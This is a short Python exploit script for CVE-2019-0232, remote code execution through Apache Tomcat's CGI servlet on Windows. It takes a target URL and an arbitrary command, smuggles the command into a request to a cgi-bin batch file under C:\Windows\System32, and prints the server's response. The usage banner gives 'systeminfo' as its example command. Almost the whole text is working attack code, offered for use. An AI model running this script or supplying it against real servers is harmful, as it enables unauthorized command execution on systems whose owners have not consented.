import requests
import sys

url = sys.argv[1]
url_dir = "/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C"
cmd = sys.argv[2]

vuln_url = url + url_dir +cmd


print '''

--------------------------------------------------------------------------------------
Apache Tomcat Remote Code Execution on Windows - cgi-bin exploit CVE-2019-0232
This will only work for tomcat deployed on Windows with enableCmdLineArguments enabled
--------------------------------------------------------------------------------------

'''

print "Usage: python CVE-2019-0232.py url/ip:port <command to execute>"
print "Example python CVE-2019-0232.py http://127.0.0.1:8080 systeminfo"

print "Given URL is:\n\n" ,vuln_url

r = requests.get(vuln_url)

print "\nThe Vuln Response Content: \n\n" , r.content
